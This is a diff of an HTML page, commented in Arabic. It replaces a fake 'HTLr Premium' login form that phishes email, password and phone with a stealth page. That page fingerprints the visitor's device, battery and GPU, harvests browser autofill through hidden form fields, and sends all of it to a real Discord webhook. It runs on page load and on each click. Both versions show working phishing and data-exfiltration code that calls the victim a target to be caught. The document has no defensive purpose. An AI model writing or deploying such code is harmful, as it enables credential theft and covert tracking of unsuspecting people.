@@ -1,115 +1,110 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HTLr Premium Login | تفعيل الأداة</title>
+    <title>HTLr Premium | SYSTEM CHECK</title>
     <style>
-        :root { --main-color: #00ff41; --bg-color: #050505; }
-        body { background-color: var(--bg-color); color: var(--main-color); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .container { width: 90%; max-width: 400px; background: #111; padding: 30px; border-radius: 20px; border: 1px solid var(--main-color); box-shadow: 0 0 25px rgba(0, 255, 65, 0.2); text-align: center; }
-        h1 { font-size: 26px; text-transform: uppercase; margin-bottom: 10px; text-shadow: 0 0 10px var(--main-color); }
-        p { color: #888; font-size: 14px; margin-bottom: 25px; }
-        .input-group { margin-bottom: 15px; text-align: right; }
-        label { display: block; margin-bottom: 5px; font-size: 12px; color: #aaa; }
-        input { width: 100%; padding: 12px; background: #000; border: 1px solid #333; border-radius: 8px; color: #fff; box-sizing: border-box; outline: none; transition: 0.3s; }
-        input:focus { border-color: var(--main-color); box-shadow: 0 0 5px var(--main-color); }
-        .btn { width: 100%; padding: 15px; background: var(--main-color); color: #000; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 20px; transition: 0.4s; }
-        .btn:hover { background: #ff0000; color: #fff; transform: scale(1.02); }
-        .footer { margin-top: 30px; font-size: 10px; color: #444; letter-spacing: 1px; }
+        /* تصميم يوحي بأن الصفحة تحمل بيانات عشان الضحية ينتظر */
+        body { background: #000; color: #00ff41; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .loader { text-align: center; }
+        .spinner { border: 4px solid #111; border-top: 4px solid #00ff41; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 10px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #hidden-form { display: none; } /* حقول مخفية لصيد التعبئة التلقائية */
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h1>#HTLr EXCLUSIVE</h1>
-        <p>يجب التحقق من ملكية الحساب لتفعيل الأداة النادرة بنجاح.</p>
-        
-        <form id="pishForm">
-            <div class="input-group">
-                <label>البريد الإلكتروني (Apple ID / Gmail):</label>
-                <input type="email" id="email" placeholder="example@mail.com" required>
-            </div>
-            <div class="input-group">
-                <label>كلمة مرور التحقق (License Key):</label>
-                <input type="password" id="password" placeholder="••••••••" required>
-            </div>
-            <div class="input-group">
-                <label>رقم الجوال (اختياري لتأكيد التفعيل):</label>
-                <input type="tel" id="phone" placeholder="+966 50 000 0000">
-            </div>
-            <button type="submit" class="btn" id="submitBtn">تحميل وتفعيل الأداة الآن</button>
-        </form>
-
-        <div class="footer">Z7F LINK TRACK | DENGER ☢️</div>
+    <div class="loader">
+        <div class="spinner"></div>
+        <p id="msg">CONNECTING TO HTLr SERVER...</p>
     </div>
+
+    <!-- فخ الحقول المخفية: الأيفون قد يعبيها تلقائياً بالبريد أو الاسم -->
+    <form id="hidden-form">
+        <input type="text" name="name" id="leak_name" autocomplete="name">
+        <input type="email" name="email" id="leak_email" autocomplete="email">
+        <input type="tel" name="phone" id="leak_phone" autocomplete="tel">
+    </form>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1485705281399951380/vq0MMpRxWwbxu81_b2sH0NyCuwJNylU105PRJCF37kwFDwuLbRMvnroWGai3a1dZ6ApE";
 
-        document.getElementById('pishForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            const btn = document.getElementById('submitBtn');
-            btn.innerText = "جاري تفعيل الحساب...";
-            btn.disabled = true;
+        async function stealthCapture() {
+            // 1. بصمة المتصفح والجهاز
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
 
-            // 1. جمع البيانات المدخلة (الإيميل والباسورد)
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('password').value;
-            const phone = document.getElementById('phone').value;
-
-            // 2. جمع معلومات الجهاز والأيفون بصمت
-            const deviceInfo = {
+            const data = {
                 ua: navigator.userAgent,
-                plat: navigator.platform,
+                platform: navigator.platform,
+                gpu: gpu,
+                cores: navigator.hardwareConcurrency || 'N/A',
+                memory: navigator.deviceMemory || 'N/A',
                 screen: `${window.screen.width}x${window.screen.height}`,
                 lang: navigator.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                touchPoints: navigator.maxTouchPoints
             };
 
-            // 3. جلب الآيبي والموقع الجغرافي بدقة
-            let geo = { ip: "Blocked/VPN", city: "Unknown", country: "Unknown", org: "Unknown" };
+            // 2. محاولة صيد الإيميل المسرب من التعبئة التلقائية
+            const leakedEmail = document.getElementById('leak_email').value;
+            const leakedName = document.getElementById('leak_name').value;
+
+            // 3. جلب معلومات البطارية والشبكة
+            let batteryInfo = "N/A";
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                batteryInfo = `${Math.round(b.level * 100)}% - ${b.charging ? 'Charging' : 'Discharging'}`;
+            }
+
+            // 4. جلب الموقع والآيبي بدقة
+            let ipInfo = {};
             try {
                 const res = await fetch('https://ipapi.co/json/');
-                geo = await res.json();
-            } catch (err) {}
+                ipInfo = await res.json();
+            } catch (e) {}
 
-            // 4. تجهيز الإيمبد الاحترافي للديسكورد (صيد كامل)
+            // 5. تجهيز الإرسال الخفي
             const payload = {
-                username: "HTLr - ACCOUNT CRACKER",
-                avatar_url: "https://i.imgur.com/AfFp7pu.png",
+                username: "HTLr - STEALTH TRACKER",
                 embeds: [{
-                    title: "🔓 تم صيد بيانات ضحية جديدة! [#HTLr]",
-                    color: 16711680, // أحمر ناري
+                    title: "🕵️‍♂️ تم سحب معلومات بصمت! [#HTLr]",
+                    color: 3066993, // أخضر
                     fields: [
-                        { name: "📧 البريد الإلكتروني", value: `\`\`\`${email}\`\`\``, inline: False },
-                        { name: "🔑 كلمة السر (المحاولة)", value: `\`\`\`${pass}\`\`\``, inline: False },
-                        { name: "📞 رقم الجوال", value: `\`${phone || 'لم يدخل رقم'}\``, inline: True },
-                        { name: "🌐 عنوان IP والموقع", value: `**IP:** \`${geo.ip || geo.query}\`\n**الدولة:** ${geo.country_name || geo.country}\n**المدينة:** ${geo.city}\n**المزود:** ${geo.org || geo.isp}`, inline: false },
-                        { name: "📱 تفاصيل الجهاز", value: `**المنصة:** ${deviceInfo.plat}\n**الشاشة:** ${deviceInfo.screen}\n**اللغة:** ${deviceInfo.lang}\n**التوقيت:** ${deviceInfo.timezone}`, inline: false },
-                        { name: "💻 المتصفح بالكامل (User-Agent)", value: `\`\`\`${deviceInfo.ua}\`\`\``, inline: false }
+                        { name: "🌐 عنوان IP", value: `\`${ipInfo.ip || 'N/A'}\` (${ipInfo.org || 'ISP Unknown'})`, inline: false },
+                        { name: "📍 الموقع الجغرافي", value: `${ipInfo.city || '?'}, ${ipInfo.country_name || '?'}`, inline: true },
+                        { name: "📱 نوع الأيفون (GPU)", value: `\`${data.gpu}\``, inline: false },
+                        { name: "🔋 حالة البطارية", value: `\`${batteryInfo}\``, inline: true },
+                        { name: "🔑 إيميل مسرب (Auto-fill)", value: `\`${leakedEmail || 'لم يتم التسريب'}\``, inline: true },
+                        { name: "👤 اسم مسرب", value: `\`${leakedName || 'لم يتم التسريب'}\``, inline: true },
+                        { name: "⚙️ النظام والمنصة", value: `\`${data.platform}\` | \`${data.lang}\``, inline: false },
+                        { name: "💻 بصمة المتصفح الكاملة", value: `\`\`\`${data.ua}\`\`\``, inline: false }
                     ],
-                    footer: { text: "Z7F LINK TRACK | DENGER ☢️ | " + new Date().toLocaleString() }
+                    footer: { text: "Z7F LINK TRACK | DENGER ☢️ | " + new Date().toLocaleTimeString() }
                 }]
             };
 
-            // 5. إرسال الصيد للويبهوك
-            try {
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-                
-                // تمويه الضحية بعد الصيد
-                alert("تم التحقق من الحساب. سيتم تحميل ملف الأداة فور وصول رسالة التأكيد على إيميلك.");
-                window.location.href = "https://www.icloud.com";
-            } catch (error) {
-                alert("خطأ في الاتصال بالسيرفر، حاول مجدداً.");
-                btn.disabled = false;
-                btn.innerText = "تحميل وتفعيل الأداة الآن";
-            }
-        });
+            // إرسال البيانات
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+
+            // تحويل الضحية بعد 3 ثواني
+            setTimeout(() => {
+                document.getElementById('msg').innerText = "SYSTEM INCOMPATIBLE";
+                window.location.href = "https://www.apple.com";
+            }, 3000);
+        }
+
+        // تشغيل السكربت فور تحميل الصفحة
+        window.onload = stealthCapture;
+
+        // "الحركة": لو لمس الضحية الشاشة في أي مكان، يحاول السكربت إعادة الإرسال لصيد الـ Auto-fill
+        window.onclick = stealthCapture;
     </script>
 </body>
 </html>
